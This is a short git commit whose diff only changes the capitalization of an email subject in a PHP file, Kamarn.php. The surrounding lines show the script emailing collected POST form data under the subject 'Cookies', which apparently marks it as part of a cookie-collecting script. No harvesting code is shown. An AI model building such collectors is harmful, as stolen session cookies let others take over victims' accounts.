ad43b5f4a693f091e95ccd86312e1df7d057c495
Uzr44911 <ahmjtalijaan@gmail.com>
2025-07-24 16:43:47 +0500

    Update Kamarn.php

--- Kamarn.php
+++ Kamarn.php
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'kamarn Cookies';
+        $mail->Subject = 'Kamarn Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
